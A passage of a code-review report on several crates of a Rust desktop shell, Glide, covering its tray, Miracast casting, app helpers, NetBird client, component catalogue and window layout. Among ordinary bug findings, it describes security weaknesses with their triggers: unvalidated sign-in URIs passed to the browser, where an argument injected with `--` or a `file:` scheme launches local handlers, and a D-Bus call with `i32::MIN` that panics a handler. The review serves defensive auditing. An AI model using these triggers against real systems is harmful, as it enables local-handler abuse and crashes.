   - **Description**: The crate has no stop path, and `configure_tray` with `[topbar] tray = false` only hides the strip (`set_tray_enabled`). The connection keeps owning `org.kde.StatusNotifierWatcher` and answers `IsStatusNotifierHostRegistered = true`, so apps keep registering and believe a tray is visible. Apps that "close to tray" (Telegram, Discord) hide their only window behind an icon nobody can see, and no other tray (waybar, snixembed) can take the watcher name. Add a shutdown request that releases the names and ends both threads, or report the host as unregistered while the tray is off.

##### AGENTS.md Trap
None identified. Pixmaps are converted to premultiplied BGRA consistently, there is no `||` over mutating calls, no process-global state or raster cache key, and `TrayHandle` methods only `send` on a channel; all D-Bus I/O runs on the `glide-tray` thread.

##### Code Health
1. **The compositor walks an untrusted `IconThemePath` recursively on every icon update**
   - **Location**: `crates/glide-compositor/src/tray.rs:40-69, 79-83`
   - **Description**: `build_icon` runs `find_in_theme_dir` up to depth 5 over whatever directory the item reports, for every `TrayEvent::Item` including each coalesced `NewIcon`, following symlinks. An item reporting `/`, `/usr/share/icons` or `$HOME` makes the tray thread crawl tens of thousands of entries per update, delaying every other item and click. It also ignores theme structure (any SVG, else the largest PNG anywhere). Cache per (path, name) and look only at `<path>/<name>.{svg,png}` and `hicolor/*/apps`.
2. **`Activate` is fire-and-forget, so items without it get no fallback**
   - **Location**: `crates/glide-tray/src/service.rs:583-612`
   - **Description**: `call_noreply` discards `UnknownMethod`. Plasma opens the context menu when `Activate` fails; here a left click on such an item (with `ItemIsMenu = false`) silently does nothing, and `TrayHandle` has no way to report it.
3. **Watcher bookkeeping is incomplete**
   - **Location**: `crates/glide-tray/src/watcher.rs:46-73`, `crates/glide-tray/src/service.rs:387-398`
   - **Description**: `RegisteredStatusNotifierItems` never emits `PropertiesChanged` although zbus introspection advertises it; `StatusNotifierHostUnregistered` is declared but never sent; `claim()` copies tracked items into the registry but not `pending` ones, so items awaiting their first fetch are missing from the list other hosts read.
4. **An item's owner is resolved once and can be wrong**
   - **Location**: `crates/glide-tray/src/service.rs:448-462, 506-512`
   - **Description**: For a well-known bus `owner_of` trusts the registering sender instead of `GetNameOwner`, falls back to the well-known name when `GetNameOwner` fails, and never re-resolves. Change signals carry the owner's unique name, so on a mismatch `refresh_owner` never matches and the item's icon and status freeze.

---

### 15. `glide-cast` (1,657 lines)

#### Summary
`glide-cast` is the Miracast (Wi-Fi Display) source, located at `crates/glide-cast`. `wfd.rs` builds and parses the WFD device-information subelement; `formats.rs` parses the sink's `wfd_video_formats` / `wfd_audio_codecs` / `wfd_client_rtp_ports` and picks one CEA mode; `rtsp.rs` holds the RTSP reader (64 KiB cap) and the sans-IO `Session` state machine for M1–M8, M16 keep-alive and `wfd_idr_request`; `p2p.rs` drives NetworkManager Wi-Fi P2P over blocking zbus (find, peers, `AddAndActivateConnection2` with Glide's WFD IEs, link address, deactivate); `pipeline.rs` builds the GStreamer pipeline (appsrc → H.264 → `mpegtsmux` → `rtpmp2tpay` → `udpsink`); `cast.rs` runs the `glide-cast-find` and `glide-cast` threads and the `Link::serve` RTSP loop, sharing a `Handle` with the compositor through a `Mutex`.

The crate has no `unsafe`, no comments and no `#[allow]`, so it complies with `AGENTS.md` § 6. `cargo clippy -p glide-cast --all-targets -- -D warnings` is clean and all 27 tests pass; `openh264enc` is installed on the review machine, so the GStreamer round-trip tests ran. The parsers held up: every index is bounds-checked, hex goes through `from_str_radix` / `try_from`, and the RTSP socket listens only on the P2P link address. Deep review found 8 Bugs, 1 AGENTS.md trap violation and 5 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **A refused Wi-Fi Direct connection now waits the full 40 s and is reported as a timeout (regression in the working tree)**
   - **Location**: `crates/glide-cast/src/p2p.rs:137-147`
   - **Description**: The uncommitted edit changed the `State` read from `.unwrap_or(DEACTIVATED)` to `.ok()`, so any D-Bus error now falls into the `_ => sleep(POLL)` arm. When GO negotiation fails or the TV user declines, NetworkManager moves the ActiveConnection to DEACTIVATED and soon unexports the object; a 250 ms poll usually misses state `4` and gets an unknown-object error instead. `connect` then loops until the 40 s `CONNECT_TIMEOUT`, reports "did not accept the connection in time" instead of "refused", and calls `DeactivateConnection` on a path that no longer exists. Treat `UnknownObject` / `UnknownInterface` as `DEACTIVATED` and keep polling only on transient errors.
2. **`vaapih264enc` is given `key-int-max`, which it does not have, so the pipeline cannot be built**
   - **Location**: `crates/glide-cast/src/pipeline.rs:9, 52`
   - **Description**: The fallback arm `hardware => format!("{hardware} bitrate={kbps} key-int-max={gop}")` covers all three hardware encoders. The `va` plugin's `vah264enc` / `vah264lpenc` have `key-int-max`; gstreamer-vaapi's `vaapih264enc` calls it `keyframe-period`. On a system with gstreamer-vaapi but without the newer `va` plugin, `gst::parse::launch` fails with a no-such-property error at PLAY and every cast ends with that error, after `hardware_encoder()` has already promoted 1080p60. (No hardware encoder is installed on the review machine; the property list comes from gstreamer-vaapi's documentation.) Give `vaapih264enc` its own arm.
3. **A display that vanishes without closing TCP is never detected; keep-alive replies are never checked**
   - **Location**: `crates/glide-cast/src/cast.rs:246-250`, `crates/glide-cast/src/rtsp.rs:208-212, 289-296`
   - **Description**: `serve` sends an M16 `GET_PARAMETER` every 20 s and announces `timeout=30`, but nothing checks that a reply arrives, and `follow_up` ignores an error reply to `KeepAlive`. When the TV loses power or goes out of range, no FIN/RST arrives, reads keep timing out harmlessly and the small writes land in the kernel buffer without hitting the 5 s write timeout. Until TCP retransmission gives up (minutes) the session stays in Streaming: frames are read back and encoded, the recording privacy dot and "Screen is cast to …" notice stay up, and each unanswered keep-alive adds a `Session::pending` entry that is never removed. There is also no deadline for the M1→PLAY exchange. Fail the session when the M16 reply does not arrive within ~5 s, as WFD prescribes, and bound negotiation time.
4. **PAUSE is advertised but answered with 501, and a repeated PLAY rebuilds the pipeline**
   - **Location**: `crates/glide-cast/src/rtsp.rs:252, 282`; `crates/glide-cast/src/cast.rs:222-226`; caller `crates/glide-compositor/src/cast.rs:159-164`
   - **Description**: The M2 `Public` header lists `PAUSE`, but `answer` has no `"PAUSE"` arm, so an M9 PAUSE (sink standby, input switch) falls through to `501 Not Implemented`. When the sink later sends PLAY again, `Event::Play` builds a second pipeline, replaces the first and emits another `Status::Streaming`, and the compositor arms another frame timer for each extra `Streaming`. Answer PAUSE with 200 and pause the stream, and make a repeated PLAY resume instead of rebuild.
5. **M4 promises an audio stream that the pipeline does not send**
   - **Location**: `crates/glide-cast/src/rtsp.rs:325-329`, `crates/glide-cast/src/cast.rs:220`, `crates/glide-cast/src/pipeline.rs:64-66`
   - **Description**: `negotiate` writes `wfd_audio_codecs` into M4 whenever the sink supports LPCM or AAC; `Session` knows nothing about `Options::audio`. The pipeline then drops audio when the user turned sound off (`choice.audio.filter(|_| self.audio)`) or when AAC was chosen and no AAC encoder exists (`audio_branch` returns `None`). The sink was told to expect an audio elementary stream that the transport stream does not contain; depending on the sink it stalls or plays video only. Pass the audio option and AAC encoder availability into `Session` and omit `wfd_audio_codecs` when no audio will be sent.
6. **Stopping during connect is reported as a failure with an untranslated reason**
   - **Location**: `crates/glide-cast/src/cast.rs:97-99, 129-130`, `crates/glide-cast/src/p2p.rs:133-135`; caller `crates/glide-compositor/src/cast.rs:169-174`
   - **Description**: Pressing Stop while `connect`, the address wait or the accept wait runs returns `Err("stopped")`, and the thread sends `Status::Ended(Some("stopped"))`. The compositor maps `Some(reason)` to `Key::CastFailed`, so the user sees a "failed: stopped" notice, in English inside a Ukrainian UI, for a deliberate action. A stop during `serve` correctly ends with `Ended(None)`. Use a distinct stop outcome that maps to `Ended(None)`.
7. **A pipeline that fails to start is dropped in a non-NULL state**
   - **Location**: `crates/glide-cast/src/pipeline.rs:121`
   - **Description**: `pipeline.set_state(gst::State::Playing).map_err(...)?` returns early and drops `pipeline` while some elements are already READY or PAUSED (e.g. `pipewiresrc` fails because PipeWire is down after the encoder and `udpsink` opened their device and socket). `Drop for Stream` never runs because no `Stream` exists; GStreamer logs "Trying to dispose element … but it is in … instead of the NULL state" and those resources leak. Set the pipeline to `Null` on the error path.
8. **The discovery thread's trailing `StopFind` can land in the middle of a cast's group formation**
   - **Location**: `crates/glide-cast/src/cast.rs:57-81, 110-112`
   - **Description**: `discover` cannot be cancelled: it always runs its full `seconds` and then calls `p2p.stop_find()`. The user may pick a display while the search runs; `run` then calls `stop_find` and `connect`, which can take up to 40 s while the TV asks its user. A pick near the end of the 30 s window lets the discovery thread's `StopFind` reach wpa_supplicant during GO negotiation, where `p2p_stop_find` resets the P2P state and can abort the join (effect not observed live). Give discovery a stop handle, cancel it from `start`, and skip the trailing `StopFind` once a cast began.

##### AGENTS.md Trap
1. **The pipeline is torn down while holding the mutex the compositor's render path takes ("Blocking the event loop")**
   - **Location**: `crates/glide-cast/src/cast.rs:39-43, 98, 227`; caller `crates/glide-compositor/src/backend/tty.rs:1834`
   - **Description**: `tty.rs` calls `Cast::push_frame` → `Handle::push_frame` on the compositor thread for every due frame, which locks `stream`. The cast thread drops `Stream` inside that lock twice: at the end of a session (`slot.lock()….take();`, the taken value dropped before the guard) and on a repeated PLAY (`*slot.lock()… = Some(...)` drops the old value during assignment). `Drop for Stream` sends EOS and calls `set_state(Null)`, which waits for the streaming threads (pipewiresrc teardown, encoder flush) and can take far longer than a frame. The frame timer keeps firing until `Status::Ended` is handled, so the event loop stalls on `lock()` at every session teardown. Swap the value out under the lock and drop it after releasing the guard.

##### Code Health
1. **One unreadable device makes `P2p::open` fail entirely**
   - **Location**: `crates/glide-cast/src/p2p.rs:77-80`
   - **Description**: The `DeviceType` read uses `.map_err(failed)?`, so a device removed between `GetDevices` and the read aborts the whole open even when a Wi-Fi P2P device follows. Skip unreadable devices.
2. **`Peer` equality includes `strength`, so the picker is re-posted every second and picks are index-keyed**
   - **Location**: `crates/glide-cast/src/p2p.rs:21-28, 40`, `crates/glide-cast/src/cast.rs:70-73`; caller `crates/glide-compositor/src/cast.rs:122`
   - **Description**: Signal jitter makes `peers != last` true on almost every 1 s poll and the list is re-sorted by strength; the compositor re-pushes the resident picker each time. Picks are keyed by index (`cast:N`) and resolved against the current list at click time, so a re-sort between drawing and clicking can start a different display. Compare and key by peer path.
3. **`choose_video` prefers any CBP entry over a better mode in another entry**
   - **Location**: `crates/glide-cast/src/formats.rs:89-91`
   - **Description**: It takes the first codec entry with the CBP bit and chooses a mode only from it, so a sink listing CBP at 640×480 and CHP at 1080p gets 640×480. Choose the best (entry, mode) pair across all entries.
4. **Constrained High is requested as plain `profile=high`**
   - **Location**: `crates/glide-cast/src/pipeline.rs:30-32`
   - **Description**: For a CHP-only sink the caps ask for `profile=high`, which does not forbid B-frames, so the stream matches the announced profile only if the encoder's defaults happen to disable them. Use `constrained-high` or disable B-frames explicitly.
5. **Stop does not wait for the sink's M8 TEARDOWN**
   - **Location**: `crates/glide-cast/src/cast.rs:194-197`
   - **Description**: `serve` writes the TEARDOWN trigger and returns at once; `run` drops the socket and deactivates the link before the sink can send M8, so the sink sees a broken connection instead of an orderly teardown. Wait briefly (1–2 s) for M8.

---

### 16. `glide-app` (1,695 lines)

#### Summary
`glide-app` holds the client-side helpers shared by Glide apps, located at `crates/glide-app`. `lib.rs` has the `org.glide.Shell1` names, `Look::from_properties` and the `look_changes()` thread (`GetAll`, then a re-read on every `PropertiesChanged`, 3 → 30 s backoff). `activation.rs` activates a window through xdg-activation over a second wayland-client connection on the toolkit's `wl_display`. `menubar.rs` exports the menu bar over dbusmenu at `/MenuBar` and registers it with `org_kde_kwin_appmenu`. `quicklist.rs` holds the LauncherEntry quicklist dbusmenu (`QuickMenu`) and `keep_announced`; `search_provider.rs` is the server side of `org.gnome.Shell.SearchProvider2`; `chooser.rs` is the JSON contract between the file-chooser portal and Files; `integration.rs` has the Terminal `OpenTab` and FileManager1 helpers; `i18n.rs` holds `Lang`, plurals and the `catalogue!` macro.

`unsafe` appears in `menubar.rs:344,347`, `activation.rs:26,29` and `tests/menubar_bus.rs:46`, each with a `// SAFETY:` comment; all other comments justify an `#[allow]`, so the crate complies with `AGENTS.md` § 6. `cargo clippy -p glide-app --all-targets -- -D warnings` is clean and all 20 tests pass (19 unit, 1 integration on a private `dbus-daemon`). Deep review found 1 Bug, no AGENTS.md trap violations and 5 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **Menu and quicklist labels are exported without escaping `_`, so readers drop or misread underscores**
   - **Location**: `crates/glide-app/src/menubar.rs:136, 148`, `crates/glide-app/src/quicklist.rs:32`
   - **Description**: In dbusmenu a single `_` in `label` marks a mnemonic and only `__` is a literal underscore. `Tree::add` and `QuickMenu::properties` insert labels verbatim (`insert("label", owned(label.as_str()))`), and glide-sdk passes them through unchanged. Every Glide reader strips mnemonics (`glide-appmenu/src/model.rs:85-98` for the top bar, `glide-compositor/src/launcher_entry.rs:60` for the dock quicklist). Glide Text's File › Open Recent lists raw file names, so `report_final.md` shows as `reportfinal.md` and `__init__.py` as `_init_.py`; a custom XDG folder `my_docs` in Files' quicklist reads `mydocs`; KDE and other consumers also turn the next character into an access key. Escape `_` as `__` in both places.

##### AGENTS.md Trap
None identified. No `||` over mutating calls, no global painter or caches, no reaping by `-1`, and every caller of `open_terminal_tab` / `show_in_files` / `activation::activate` (compositor, SDK, Files, Terminal) runs it on a thread or background task.

##### Code Health
1. **Disabled entries still deliver clicks, and node ids are positional**
   - **Location**: `crates/glide-app/src/menubar.rs:122-158, 229-238`
   - **Description**: `Server::event` forwards `clicked` for any node with an action regardless of `enabled`, and glide-sdk registers the messages of disabled items too, so any bus peer (or a shell holding a stale layout) can run a disabled command. Node ids are DFS positions reassigned on every `rebuild`: adding one Open Recent entry shifts every later id, so a click sent against the previous revision runs a different action. Ignore events on disabled nodes and derive ids from stable action ids.
2. **The shell look is re-fetched in full and pushed to every app on unrelated changes**
   - **Location**: `crates/glide-app/src/lib.rs:24-34, 95-112`
   - **Description**: `Look` includes `locked` and `active_workspace`, and `follow` runs a full `GetAll` (including the multi-KB `Tokens` JSON) on every `PropertiesChanged`. Every workspace switch and lock/unlock therefore yields a "new" Look in every SDK app, which runs `apply_look` → `Look::load()` (a synchronous `glide.toml` read on the UI thread), `refresh_paint` and `App::look_changed`; no consumer reads those two fields. Dedup on appearance fields and apply the signal's `changed_properties`.
3. **Threads and Wayland objects outlive a dropped receiver**
   - **Location**: `crates/glide-app/src/menubar.rs:321-329, 354-359`, `crates/glide-app/src/lib.rs:108-112`, `crates/glide-app/src/quicklist.rs:147-160`
   - **Description**: `register` checks `events.is_closed()` only after a registry event, so the `glide-menubar-wayland` thread outlives its subscription until a global changes; it never sends `org_kde_kwin_appmenu.release`, and on `GlobalRemove` the bound manager is dropped without `release`, so server-side objects pile up each time the global menu is toggled. `follow` and `keep_announced` notice shutdown only on the next signal, and `look_changes` never resets a dead connection, retrying it forever.
4. **Peer-controlled `recursion_depth` overflows in debug builds**
   - **Location**: `crates/glide-app/src/menubar.rs:181`
   - **Description**: `self.structure(child, depth - 1)` with `GetLayout(0, i32::MIN, [])` from any session-bus peer overflows; with overflow checks on (dev profile) the zbus handler panics. Use `saturating_sub` or clamp negatives to -1.
5. **The integration test can leak its bus daemon and skip silently**
   - **Location**: `crates/glide-app/tests/menubar_bus.rs:32-46, 131`
   - **Description**: `daemon.kill()` runs only on success, so a failed assertion orphans a `--nofork` `dbus-daemon`; a missing `dbus-daemon` makes the test pass vacuously. Hold the child in a kill-on-drop guard and fail or skip explicitly.

---

### 17. `glide-netbird` (2,190 lines)

#### Summary
`glide-netbird` is the client for the NetBird daemon's gRPC API, located at `crates/glide-netbird`; it reaches the daemon over `/var/run/netbird.sock` (or `NB_DAEMON_ADDR=unix://…`). `build.rs` compiles the vendored `proto/daemon.proto` with protox and tonic-prost-build (client only). `client.rs` is a sync facade over a lazily created one-worker tokio runtime whose `block_on` works from plain threads, foreign runtimes and its own worker; it holds every RPC wrapper, `Daemon::watch` (SubscribeStatus and SubscribeEvents tasks with 1 → 10 s backoff) and the login, profile and session-extension flows. `model.rs` has the domain types with redacting `Debug` impls; `events.rs` classifies daemon events into notices; `error.rs` maps statuses (including PRIVILEGE_REQUIRED details); `time.rs` converts protobuf time and parses RFC 3339; `profile_state.rs` handles `<id>.state.json` and `active_profile.txt` with whitelisted ids, written atomically at 0600 through `glide_config::write_private`.

The crate has no `unsafe`; the only comments are three `#[allow]` justifications, so it complies with `AGENTS.md` § 6. `cargo clippy -p glide-netbird --all-targets -- -D warnings` is clean and all 25 unit tests pass. Deep review found 3 Bugs, no AGENTS.md trap violations and 5 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **A daemon without SubscribeStatus never yields a status, so the "outdated" notice never shows**
   - **Location**: `crates/glide-netbird/src/client.rs:460-495`; caller `crates/glide-topbar/src/netbird.rs:150-183`
   - **Description**: `watch_status` reports `Status::unavailable()` only when `error.is_unavailable()`; an `Unimplemented` reply is retried every 10 s forever and no `Feed::Status` is ever produced. SubscribeStatus belongs to the newer UI API (`UpRequest.async` refers to it, and `WailsUIReady` exists to detect daemons that predate it), so older daemons take this path. The topbar emits `Event::Outdated` only inside `on_status` after `daemon.compatible()`, so the compatibility check written for exactly this case never runs, the quick-settings tile never gets a state and a pending Connect is never resolved; the unary `Status` RPC, which still works, is never tried. The crate already falls back for `GetEvents` on `Unimplemented`. On `Code::Unimplemented` fall back to polling `Status`.
2. **The new 10 s timeout on `subscribe_events` keeps dropping the events subscription on an idle daemon (uncommitted change)**
   - **Location**: `crates/glide-netbird/src/client.rs:458, 497-512`
   - **Description**: A tonic server-streaming call resolves only when the response headers arrive, and grpc-go sends them lazily, on the first `Send` (or an explicit `SendHeader`). SubscribeStatus sends a snapshot at once, so its timeout is harmless; SubscribeEvents has nothing to send until an event happens, so `timeout(SUBSCRIBE_WAIT, client.subscribe_events(..))` cancels an idle subscription after 10 s. `delay` is reset only when a message arrives, so the loop settles into ~10 s subscribed and up to 10 s unsubscribed. The daemon fans events out only to live subscribers and nothing back-fills from `GetEvents`, so session warnings, update-available, MDM-policy and DNS/route messages published in the gaps (about half the time) are lost, and the daemon churns a subscription every cycle. (This assumes the daemon's handler does not call `SendHeader`; it is not in this repository.) Bound only the connect, or back-fill with `GetEvents` after each resubscribe.
3. **Sign-in and session-extension URIs from the daemon reach the browser unvalidated, as a bare argument**
   - **Location**: `crates/glide-netbird/src/client.rs:207-217, 398-408`; callers `crates/glide-compositor/src/netbird.rs:14-23`, `crates/glide-settings/src/services/netbird.rs:66-83`
   - **Description**: `LoginStart.uri` and `ExtendStart.uri` are relayed from the management server's IdP configuration, which a self-hosted or compromised management server controls. The crate does no scheme check, and both callers run `$BROWSER <uri>` / `xdg-open <uri>` without `--`. A URI beginning with `--` becomes a browser option for Chromium-family `$BROWSER` values, and `file:` or custom schemes are dispatched by `xdg-open`, giving a remote server a way to launch local handlers in the user's session. Accept only `https://` (and perhaps `http://`) and pass `--` before the URI.

##### AGENTS.md Trap
None identified. The only `||` is in the pure `installed()` predicate; the global runtime is stateless and the profile-state tests use per-test directories; all RPCs run on the topbar's `glide-netbird-worker` and its login/extend threads; the crate spawns no children.

##### Code Health
1. **`report(&Error::Timeout, …)` is a no-op**
   - **Location**: `crates/glide-netbird/src/client.rs:463-472`
   - **Description**: `report` only acts on `is_unavailable()`, so a status subscribe that times out (the daemon accepts the connection but hangs) never produces `Status::unavailable()` and the shell keeps showing the last state, e.g. Connected. Report timeouts as unavailable or drop the arm.
2. **`parse_rfc3339` can overflow**
   - **Location**: `crates/glide-netbird/src/time.rs:25-32, 71`
   - **Description**: `days_from_civil(..) * 86_400 + …` is unchecked `i64` arithmetic on a year parsed from any digit string. A malformed `session_expires_at` like `999999999999999-01-01T00:00:00Z` panics the topbar's NetBird worker in debug builds (ending the integration) and yields a garbage instant in release. Use checked arithmetic or bound the year.
3. **The leftover-temp-file test no longer tests anything**
   - **Location**: `crates/glide-netbird/src/profile_state.rs:109-121`
   - **Description**: It plants `.default.state.json.tmp`, but `write_private` now writes `.default.state.json.<pid>.<n>.glide.tmp` with `create_new`, so nothing collides and the test is vacuous.
4. **The profile-switch order does not match the documented one**
   - **Location**: `crates/glide-netbird/src/client.rs:295-314`
   - **Description**: AGENTS.md §9.1 says switches go Down → Switch → Up; the code does Switch → Down → Up. A failure of the final `up()` is returned as a failure of the whole switch, so callers toast "switch to profile X failed" although the daemon already switched and `active_profile.txt` was rewritten.
5. **Glide's own 15-minute limit is reported as "service unreachable"**
   - **Location**: `crates/glide-netbird/src/client.rs:223, 416-420`
   - **Description**: `finish_login` and `wait_extend` use a fixed `INTERACTIVE` (15 min) limit, ignore `expires_in`, and turn the timeout into `Error::Timeout`, whose `reason()` is `DaemonUnreachable`; an abandoned browser sign-in is shown as "the service is not reachable".

---

### 18. `glide-catalog` (2,384 lines)

#### Summary
`glide-catalog` is the `glide-catalog` binary, located at `crates/glide-catalog`: an iced app run through `glide_sdk::run` that shows every SDK component and doubles as a notification / dock / OSD / quick-settings test bench. `src/lib.rs` holds the `Catalog` state, the `Message` dispatcher, the notification draft and presets, the simulated download, the exported menus and subscriptions; `src/pages.rs` draws 14 pages (Overview, Buttons, Inputs, Selection, Feedback, Layout, Cards, Insight, Secrets, Overlays, Type, Motion, Notifications, System); `tests/frames.rs` checks headlessly that pages stop asking for frames.

The crate has no `unsafe`; the only comments justify `#[allow(clippy::struct_excessive_bools / too_many_lines)]`, so it complies with `AGENTS.md` § 6. Strings are localised with inline `shell.t(uk, en)` pairs, but several user-visible strings skip it (Bug 4). `cargo clippy -p glide-catalog --all-targets -- -D warnings` is clean and both tests pass (1 unit, 1 integration). Deep review found 5 Bugs, 2 AGENTS.md trap violations and 3 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **The simulated download keeps replacing a dead id, flooding the centre with resident notifications**
   - **Location**: `crates/glide-catalog/src/lib.rs:351-358, 373-394, 569-583`
   - **Description**: `tick()` sends every update with `.replaces(id)` and `Self::send(notification, false)`; the reply (`Sent(false, Ok(new_id))`) only updates `self.last`, never the id in `self.download`. The Glide server honours `replaces_id` only while that id is live (`glide-notify/src/server.rs:58-60, 192-200`) and otherwise allocates a fresh one. Start "Download with progress" and click "Withdraw" (`self.last` is the download's id, since every tick reply overwrites it), or dismiss the download in the shell: each of the remaining ~13 ticks creates a new resident notification with a progress bar that is never replaced or cleared. The `Closed` event for the download id is only logged. While a download runs, "Replace last" and "Withdraw" also target the download instead of the draft, and pressing the preset again orphans the previous resident notification at its last percentage. Update the slot from tick replies, keep `last` for draft sends only, and stop the download on `Closed`.
2. **Any failed send cancels a running download and reports "No notification server"**
   - **Location**: `crates/glide-catalog/src/lib.rs:587-591`
   - **Description**: `Message::Sent(_, Err(_))` sets `self.download = None` whichever send failed, and the server refuses an identical notification within `FLOOD_WINDOW` (1 s). Pressing Ctrl+Enter twice quickly during a download stops the ticker and leaves the resident download notification frozen at, say, 35 % for good, while the toast claims the server is unavailable. Clear `download` only when the download's own send failed, and show the server's error.
3. **A preview with only an accent freezes the window's appearance**
   - **Location**: `crates/glide-catalog/src/lib.rs:327-341` (no `look_changed` override)
   - **Description**: With look "System" and an accent chip selected, `apply_preview` passes `Some((current.appearance_now(), accent))` to `shell.preview_look`, snapshotting the appearance at click time. The SDK's `refresh_paint` (`glide-sdk/src/app.rs:219-224`) always prefers the stored preview and `Catalog` does not override `App::look_changed`, so when the shell turns dark (Settings or the 19:00 schedule) the catalogue stays light while "System" is still selected; with look "Dark" and the "System" accent, accent changes are ignored the same way. Re-apply the preview from `look_changed`.
4. **User-visible strings are English whatever the language**
   - **Location**: `crates/glide-catalog/src/lib.rs:123-132, 520, 528, 545-553, 600`; `crates/glide-catalog/src/pages.rs:286-294, 742-746, 752, 759, 1037` and the `Message::Said("…")` literals in `pages.rs`
   - **Description**: `Message::Said(what) => shell.toast(what)` toasts identifiers verbatim ("Copy", "Paste", "Rename", "copy link", "Eject", "Reload", "Stop"); `impl Display for Timeout` ("Server default", "Never") and `impl Display for Fruit` feed dropdowns although the same fruits are localised elsewhere; card texts "56 GB free", "Apps", "Media", "Light", "Dark", "Notifications" are literal; the event log prints the close reason with `{reason:?}` (`Expired`). Pass `shell.t(...)` text and build dropdown options from localised labels.
5. **The Catalogue menu omits four of the 14 pages**
   - **Location**: `crates/glide-catalog/src/lib.rs:644-653`
   - **Description**: `.take(10)` comes after the `.map` that builds the items, so it drops whole items, not just their shortcuts: Type, Motion, Notifications (the test bench) and System are missing from the menu, which is also the app's top-bar menu. `(index + 1) % 10` is only meaningful for the first ten. List all pages and attach shortcuts to the first ten only.

##### AGENTS.md Trap
1. **Blocking D-Bus and IPC round trips inside `update` (§7 "Blocking the event loop")**
   - **Location**: `crates/glide-catalog/src/lib.rs:619-633`
   - **Description**: `system::show_osd` and `system::open_quick_settings` go through `shell_call` (`glide-sdk/src/system.rs:17-37`), a `zbus::blocking` call whose first use also performs the bus handshake; `system::open` → `spawn_detached` adds a blocking `ActivationToken` call with a `glide_ipc` fallback. All run on the iced update thread, so each click stalls the UI for a round trip, or up to the D-Bus timeout. Notifications already use `Task::perform`; this catalogue is the reference other developers copy. Run these through `Task::perform` on a blocking worker or give the SDK async variants.
2. **Raw radii instead of `shape::R1` / `R4` (§8)**
   - **Location**: `crates/glide-catalog/src/pages.rs:1337`
   - **Description**: `[("R1", 4.0), ("R2", R2), ("R3", R3), ("R4", 18.0)]` writes two of the four radius tokens as literals on the page that presents them as tokens; `glide_sdk::theme::{R1, R4}` are exported. The page shows stale values as soon as the tokens change.

##### Code Health
1. **The event log records other apps' notification signals**
   - **Location**: `crates/glide-catalog/src/lib.rs:593-604, 686`
   - **Description**: The server broadcasts `ActionInvoked` / `NotificationClosed` without a destination, and the catalogue logs every one, so another app's expiring notification appears as "#57 closed (Expired)" on the bench. Filter on ids the catalogue sent.
2. **`Message::Flip` is shared by about ten unrelated demos**
   - **Location**: `crates/glide-catalog/src/pages.rs:563, 568, 579, 750-769, 836, 950, 975-990, 1009-1010, 1078-1079, 1375, 1393`
   - **Description**: One boolean drives the preview, choice and profile cards, the sidebar selection, the table sort, the task pause, the swatches, the motion lanes and the A/B segmented control; clicking one demo changes the others. The segmented control at line 836 always passes selection `0`, so clicking "B" flips unrelated state and its thumb never moves.
3. **The frame test depends on wall-clock time**
   - **Location**: `crates/glide-catalog/tests/frames.rs:27-52, 61, 74`
   - **Description**: A page counts as live when it still asks for frames after `Instant::now() >= until` (3 × t4). Under the 35 % CPU throttle of `ai-cargo.sh` or a loaded CI machine a settling page can miss the deadline and fail intermittently. Count frames or use a fake clock.

---

### 19. `glide-layout` (2,407 lines)

#### Summary
`glide-layout` is the compositor's window-layout model, located at `crates/glide-layout`. `layout.rs` holds `Layout`: workspaces (dynamic or fixed via `set_fixed_workspaces`, the `recent` MRU list, `move_workspace`, `move_window_to_workspace`, the overview keeping its active workspace), per-window state (placement, maximize, fullscreen / `set_fullscreen_on`, minimize, insets, parent), output lookups (`output_at`, `work_area_for_window`, `output_geometry_for_window`), `keep_reachable` / `keep_grip_reachable`, centring over a parent, cascade placement and `rescue_offscreen_windows`. `overview.rs` holds `compute_overview_layout` (best-coverage row split), `ids.rs` the atomic id newtypes, and `lib.rs` re-exports `glide-geom` and carries the unit tests.

The crate has no `unsafe` and no comments (the one suppression is an `#[expect(..., reason = …)]`), so it complies with `AGENTS.md` § 6. `cargo clippy -p glide-layout --all-targets -- -D warnings` is clean and all 71 tests pass (68 unit, 3 integration). The uncommitted early return for an empty size in `update_window_size` is correct. Workspace bookkeeping held up under tracing: `recent` is pruned at both removal sites and never holds the active id, the `active` fallback cannot go out of range, fixed-mode folding keeps `WindowState.workspace_id` and `Workspace.windows` in step. Centring goes through `keep_reachable`, so the "centring larger-than-area windows" trap is handled. Deep review found 2 Bugs, 1 AGENTS.md trap violation and 3 Code Health issues.

#### Findings

##### Critical
None identified.

##### Bug
1. **A window whose output is unplugged is not rescued while it still overlaps another output, even with its titlebar off-screen**
   - **Location**: `crates/glide-layout/src/layout.rs:820-826, 838-845`
   - **Description**: A window counts as stranded only when `!outputs.iter().any(|rect| rect.overlaps(state.geometry))`, so a single overlapping pixel skips the rescue. Output A at (0,0,1920,1080) with B above it at (0,−1080,1920,1080); a window on B at (100,−900,800,1000). Unplugging B leaves the window overlapping A by its bottom 100 px with the titlebar at y = −900, out of reach except by Super+drag. `saved_geometry` is checked the same way, so a maximized window restores to the same unreachable place. Treat a window as stranded when its grip is not reachable on any remaining output (the `keep_grip_reachable` rule).
2. **Windows do not follow their output when its origin moves, so they jump to the neighbouring monitor**
   - **Location**: `crates/glide-layout/src/layout.rs:169-176, 373-378, 817-866`
   - **Description**: Window geometry is absolute and a window's output is re-derived from its centre each time; `outputs_changed` never translates windows when an output's origin changes, although `OutputInfo.id` is stable and allows diffing. A at (0,0,1920,1080), B at (1920,0,2560,1440), a window maximized on B (centre x = 3200). The user makes A 3840 logical px wide (4K at scale 1, or scale 2 → 1) and B is re-laid at x = 3840: the centre now falls on A, so the `locked` loop re-maximizes the window onto A, and every floating window of B with x < 3840 appears on A. Match old and new outputs by id and translate `geometry` / `saved_geometry` by the origin delta before the rescue pass.

##### AGENTS.md Trap
1. **A decoration-height change breaks tiled and snapped windows ("Layout geometry vs. compositor-owned geometry")**
   - **Location**: `crates/glide-layout/src/layout.rs:731-734`; driven by `crates/glide-compositor/src/config.rs:1397-1402`
